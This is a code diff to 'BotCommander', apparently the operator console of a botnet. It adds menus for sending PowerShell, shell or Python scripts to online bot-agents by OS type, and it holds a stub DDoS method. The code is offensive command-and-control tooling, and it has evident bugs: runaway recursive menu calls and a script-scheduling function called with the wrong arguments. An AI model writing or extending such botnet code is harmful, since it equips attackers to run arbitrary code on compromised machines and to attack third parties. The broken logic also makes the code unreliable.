@@ -61,7 +61,7 @@ class BotCommander:
         2) Linux command - shell
         3) MacOS command - shell
         4) Generic command - command that can be processed by both Windows and Linux OS
-        NOTE: If you choose 3 the command will be sent to all online bot-agents, if not it will be sent
+        NOTE: If you choose 4 the command will be sent to all online bot-agents, if not it will be sent
         only to those online bot-agents running on the chosen OS type command
         5) Go back to previous menu
         """)
@@ -75,27 +75,51 @@ class BotCommander:
               f" value from commander.ini when commander is restarted.")
 
     @staticmethod
+    def __print_script_help():
+        print("""
+        The following options are available:
+        1) Powershell script - choosing this Windows filter will be automatically applied for bot-agents 
+        2) Shell script - choosing this Linux & MacOS filters will be automatically applied for bot-agents
+        3) Python script
+        4) Go back to previous menu
+        """)
+
+    @staticmethod
     def __get_user_input(message):
         return input(f"{message}")
+
+    @staticmethod
+    def __check_if_number(value):
+        try:
+            val = int(value)
+        except ValueError:
+            print("You have not inserted a digit, please insert a digit.")
+            return
+        except Exception as err:
+            print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
+                  f" This is the error: {err}")
+            return
+        return val
+
+    @staticmethod
+    def __check_if_path_is_valid(path_to_check):
+        if os.path.isfile(path_to_check):
+            return True
 
     async def __process_user_input(self):
         while True:
             self.__print_help()
-            val = 0
             msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
-            try:
-                val = int(choice)
-            except ValueError:
-                print("You have not inserted a digit, please insert a digit.")
-            except Exception as err:
-                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
-                      f" This is the error: {err}")
+            val = self.__check_if_number(choice)
+            if not val:
+                print("Please insert a number...")
+                await self.__process_user_input()
             match val:
                 case 1:
                     await self.__exec_shell_cmd()
                 case 2:
-                    self.__exec_python_script()
+                    await self.__exec_script()
                 case 3:
                     pass
                 case 4:
@@ -196,8 +220,36 @@ class BotCommander:
             logger.core.error(f'Unexpected exception when writing stream {payload.decode("utf-8")} to bot-agent'
                               f' {self.uuids.get(uuid)}:{self.uuids[uuid]["addr"]} - {err}')
 
-    def __exec_python_script(self):
-        pass
+    async def __exec_script(self):
+        while True:
+            self.__print_script_help()
+            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
+            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+            val = self.__check_if_number(choice)
+            if not val:
+                print("Please insert a number...")
+                await self.__exec_script()
+            match val:
+                case 1:
+                    script_type = "powershell"
+                case 2:
+                    script_type = "shell"
+                case 3:
+                    script_type = "python"
+                case 4:
+                    break
+                case _:
+                    print("Please insert 1, 2, 3 or 4, nothing else")
+                    await self.__exec_script()
+            await self.__schedule_script(script_type)
+
+    async def __schedule_script(self, script_type):
+        while True:
+            msg = "Please insert absolute path for script which you want to send to bot-agents: "
+            path_to_script = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+            if not self.__check_if_path_is_valid(path_to_script):
+                await self.__schedule_script()
+            await self.__schedule_script(script_type, path_to_script)
 
     def __perform_ddos(self):
         pass
